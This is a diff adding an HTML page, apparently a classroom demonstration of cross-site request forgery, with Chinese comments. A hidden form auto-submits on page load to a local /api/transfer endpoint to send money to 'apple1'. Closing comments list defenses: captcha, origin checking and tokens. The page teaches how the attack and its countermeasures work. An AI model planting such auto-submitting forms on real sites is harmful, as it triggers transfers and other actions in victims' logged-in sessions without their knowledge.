@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title></title>
+</head>
+<body>
+	第三方网站其实是拿不到用户的cookie的，因为当往3000端口提交内容的时候，会把3000端口的内容提交过去，自动会带上cookie
+
+	同源策略指的是ajax
+	表单提交是不存在跨域的问题的
+	<form name="myform" action="http://localhost:3000/api/transfer" method="post">
+		<input type="text" name="target" value="apple1">
+		<input type="text" name="money" value="100">
+	</form>
+	<script type="text/javascript">
+		// 必须是用户登陆过 访问的时候才能够带上cookie
+		document.myform.submit()
+
+		/*
+			1- 添加验证码 （体验不好）不是单纯的用户名字+密码
+			2- 判断来源 如果是3001 -> 3000 那么肯定是伪造的
+			3- token的
+
+
+		*/
+	</script>
+</body>
+</html>
